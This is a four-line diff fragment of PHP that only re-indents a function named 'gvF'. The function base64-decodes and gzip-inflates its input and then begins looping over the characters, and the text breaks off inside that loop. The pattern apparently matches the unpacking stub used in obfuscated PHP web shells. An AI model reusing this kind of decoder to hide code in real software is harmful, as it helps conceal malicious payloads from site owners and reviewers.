@@ -1,4 +1,4 @@
-function gvF($qufdF)
+ function gvF($qufdF)
 { 
 $qufdF=gzinflate(base64_decode($qufdF));
  for($i=0;$i<strlen($qufdF);$i++)
